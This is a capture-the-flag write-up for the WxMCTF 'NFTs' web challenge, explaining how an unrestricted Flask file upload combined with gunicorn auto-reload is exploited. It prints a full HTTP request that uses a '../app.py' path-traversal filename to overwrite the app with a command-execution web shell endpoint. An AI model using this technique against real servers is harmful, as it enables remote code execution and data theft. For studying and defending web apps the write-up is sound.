# WxMCTF Web 3 - NFTs
> Seize the means of minting!

## About the Challenge
We were given a web source code (You can download the source code [here](dist.zip)) and we can start an instance too. Here is the preview of the website

## How to Solve?
There are 2 functionality on the website, we can upload some file to the website and then we can access the file in `nfts` endpoint. Pretty simple right? If we check the `launch.sh` file
```sh
#!/bin/sh
gunicorn -w 1 -b 0.0.0.0:5000 --reload app:app
python -m http.server 5000
```

The gunicorn will restart if there is a code change in the source code. And because there is no restriction at all on the upload feature

```python
from flask import Flask, request, render_template, redirect, flash, make_response
from flask import send_from_directory
import os

app = Flask(__name__)
app.secret_key = os.urandom(16)

@app.route("/", methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        if 'file' not in request.files:
            flash('No file part')
            return redirect(request.url)
        file = request.files['file']
        if file.filename == '':
            flash('No selected file')
            return redirect(request.url)
        if file:
            file.save(os.path.join("./nfts/", file.filename))
            return redirect(request.url)

    return render_template('index.html')

@app.route('/nfts')
def browse_nfts():
    nfts = os.listdir("nfts")
    return render_template('nfts.html', nfts=nfts)

@app.route('/nft/<name>')
def send_nft(name):
    return send_from_directory("nfts", name, mimetype="application/octet-stream", as_attachment=True)
```

The idea here is you need to update the source code called `app.py` and add a malicious code. If you can see the HTTP request below, i added an endpoint called `test` to run an OS command

```
POST / HTTP/1.1
Host: 59db0cc.678470.xyz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------263566758113396374204204538370
Content-Length: 1456
Origin: http://59db0cc.678470.xyz
Connection: close
Referer: http://59db0cc.678470.xyz/
Upgrade-Insecure-Requests: 1

-----------------------------263566758113396374204204538370
Content-Disposition: form-data; name="file"; filename="../app.py"
Content-Type: application/octet-stream

from flask import Flask, request, render_template, redirect, flash, make_response
from flask import send_from_directory
import subprocess,os

app = Flask(__name__)
app.secret_key = os.urandom(16)

@app.route("/", methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        if 'file' not in request.files:
            flash('No file part')
            return redirect(request.url)
        file = request.files['file']
        if file.filename == '':
            flash('No selected file')
            return redirect(request.url)
        if file:
            file.save(os.path.join("./nfts/", file.filename))
            return redirect(request.url)

    return render_template('index.html')

@app.route('/nfts')
def browse_nfts():
    nfts = os.listdir("nfts")
    return render_template('nfts.html', nfts=nfts)

@app.route('/nft/<name>')
def send_nft(name):
    return send_from_directory("nfts", name, mimetype="application/octet-stream", as_attachment=True)

def run_command(command):
    return subprocess.Popen(command, shell=True, stdout=subprocess.PIPE).stdout.read()

@app.route('/test/<command>')
def command_server(command):
    return run_command(command)
-----------------------------263566758113396374204204538370--
```

After sending the request, Im waiting for 1 sec and then I access `http://example/test/env` to get the flag because the flag was located on the environment

```
Because the instance was dead, there is no flag here
```